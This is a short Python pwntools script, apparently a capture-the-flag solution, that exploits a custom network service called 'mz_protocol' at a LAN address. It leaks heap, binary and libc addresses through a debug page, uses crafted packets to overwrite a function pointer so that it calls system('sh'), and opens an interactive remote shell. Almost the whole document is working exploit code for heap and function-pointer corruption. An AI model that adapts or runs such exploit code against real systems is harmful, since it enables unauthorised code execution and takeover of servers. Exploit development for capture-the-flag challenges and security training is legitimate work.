from pwn import *
exe = context.binary = ELF('./mz_protocol', checksec = 0)
libc = ELF("./libc.so.6", checksec = 0)
ld = ELF("./ld-2.35.so", checksec = 0)
def send_packet(body):
    checksum = 0
    for b in body:
        checksum += b
    payload = b"MZ"
    payload += p16(len(body) + 1, endian="big")
    io.send(payload)
    body_final = bytearray()
    body_final.extend(body)
    body_final.append((119 - checksum) % 256)
    io.sendafter(b"Recv Packet : ", body_final)


context.log_level = "warn"

io = None

while True:
    # io = process('./mz_protocol')
    io = remote("192.168.0.52", 10001)
    try:
        send_packet(cyclic(20))
        io.sendline(b"0")
        send_packet(b"AAAA")
        io.sendline(b"0")

        io.recvuntil(b"[*WARNING]Develope Test Page[*WARNING]")
        io.recvlines(11)
        io.recv(62)
        heap = int(io.recvuntil(b" ", drop=True), 16)
        log.warn(f"heap @ 0x{heap:x}")
        io.recvline()
        io.recv(62)
        exe.address = int(io.recvuntil(b" ", drop=True), 16) - exe.sym["print_protocol"]
        log.warn(f"program @ 0x{exe.address:x}")
        assert exe.address & 0xfff == 0

        payload = flat({
            40: [
                0x31,
                b"MZ\0\x01\0\0\0\0",
                exe.got["puts"],
                exe.sym["print_protocol"],
                0x77
            ]
        })

        # print(len(payload))

        send_packet(payload)
        io.sendline(b"2")
        io.recvuntil(b"[*WARNING]Develope Test Page[*WARNING]")
        io.recvlines(4)
        io.recv(60)
        libc.address = int(io.recvline().strip(b"\n |"), 16) - libc.sym["puts"]
        log.warn(f"libc @ 0x{libc.address:x}")
        assert libc.address & 0xfff == 0

        print("Dropping shell")

        one_gadget = list(map(int, "330311 965761 965765 965768".split()))

        payload = flat({
            0: b"\x77\0\0\0\0\0\0\0",
            40: [
                0x31,
                b"sh \0\0\0\0\0",
                heap + 0x120,
                libc.sym["system"],
                0x77
            ]
        }, filler=b"\0")

        send_packet(payload)
        io.sendline(b"3")

        io.sendline(b"uname")
        io.recvuntil(b"Linux")
        break
    except:
        exe.address = 0
        libc.address = 0
        io.close()
        continue

io.interactive()